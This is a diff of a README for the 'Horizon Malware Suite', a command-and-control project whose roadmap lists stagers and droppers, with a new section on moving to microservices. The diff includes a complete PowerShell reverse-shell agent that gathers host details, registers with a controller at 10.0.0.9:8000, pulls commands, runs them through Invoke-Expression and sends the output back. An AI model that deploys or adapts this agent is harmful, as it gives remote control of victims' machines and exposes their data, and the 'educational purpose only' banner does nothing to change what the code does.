@@ -9,7 +9,7 @@
 
 -----------------------------------------------------------------------------------
 
-**THIS SERVICE IS DESIGNED FOR EDUCATIONAL PURPOSE ONLY! DO NOT USE IT FOR ILLEGAL PURPOSES!**
+**THIS PROJECT IS DESIGNED FOR EDUCATIONAL PURPOSE ONLY! DO NOT USE IT FOR ILLEGAL PURPOSES!**
 
 ***Go to the [development-microservices](https://github.com/maxbirnbacher/HorizonBackbone/tree/development-microservices) branch for a preview of the microservices version (currently in development and not ready for production).***
 
@@ -24,11 +24,21 @@ The heart of the Horizon Malware Suite and used for all kinds of things.
 - [X] Make a better UI for the web-interface
 - [X] C2 Server and API
 - [X] Frontend for C2 Server
+- [ ] Rewrite API and frontend as microservices
 - [ ] API & frontend authentication
 - [ ] Dynamic creation of stagers/droppers
 - [ ] Frontend-Dialog for stager/dropper creation
 - [ ] File upload for droppers
 
+
+## Why microservices?
+
+I want to make the whole Horizon Malware Suite as modular as possible. This way you can use the parts you need and don't have to use the whole suite.
+Another aspect is that I want to add scalability to the project. If you want to use the whole suite you can just spin up multiple instances of the microservices and use a load balancer to distribute the load.
+
+It will also allow me to develop the different parts of the suite independently from each other. This way I can focus on one part at a time and don't have to worry about breaking other parts of the suite.
+
+Microservices will bring a very big change to the project. For example the frontend will be a NodeJS application that will communicate with the API via REST. I previously used Jinja2 templates to render the frontend. This is why I also need to rewrite parts of the API.
 
 ## Setup & Start
 
@@ -71,7 +81,7 @@ The workflow is as follows:
 
 #### Reverse Shell Example
 
-Here is an example of a reverse shell using the C2 Server.
+Here is an example of a reverse shell using the C2 Server. Replace the IP address in the `$main_url` variable and in some other url variables with the IP address of your server.
 
 ```PowerShell
 $ip_address=((ipconfig|Select-String "IPv4 Address").ToString() -split ": ")[-1];$os_type=(Get-WmiObject -Class Win32_OperatingSystem).Caption;$hostname=(Get-WmiObject -Class Win32_ComputerSystem).Name;$username=[Environment]::UserName;$main_url="http://10.0.0.9:8000";$interval=30;$intervalUnit="Seconds";$body=@{os_type=$os_type;ip_address=$ip_address;hostname=$hostname;username=$username;password="placeholder"}|ConvertTo-Json;Write-Host "IP Address: $ip_address";Write-Host "OS Type: $os_type";Write-Host "Hostname: $hostname";Write-Host "Username: $username";$url="http://10.0.0.9:8000/register?os_type=$os_type&ip_address=$ip_address&hostname=$hostname&username=$username&password=$password";$response=Invoke-RestMethod -Method Post -Uri $url;$connection_id=$response.id;Write-Host "Registered connection with ID: $connection_id";while($true){$url="$main_url/commands/$connection_id";$command=Invoke-RestMethod -Method Get -Uri $url;Write-Host "Received command: $command";if([string]::IsNullOrEmpty($command)){write-host "No command received yet...";$startSleepCmd="Start-Sleep -$intervalUnit $interval";$startSleepCmdStr=[String]$startSleepCmd;Invoke-Expression $startSleepCmdStr;continue;}if($command -eq "exit"){write-host "Exiting...";break;}write-host "Executing command: $command";if($command -ne "" -or $null -ne $command){$commandStr=[String]$command;$result=Invoke-Expression $commandStr;$output=$result|Out-String;$body=@{output=$output}|ConvertTo-Json;$url="$main_url/output/send/$connection_id";$body=@{output=$output}|ConvertTo-Json;Invoke-RestMethod -Method Post -Uri $url -Body $body;}}
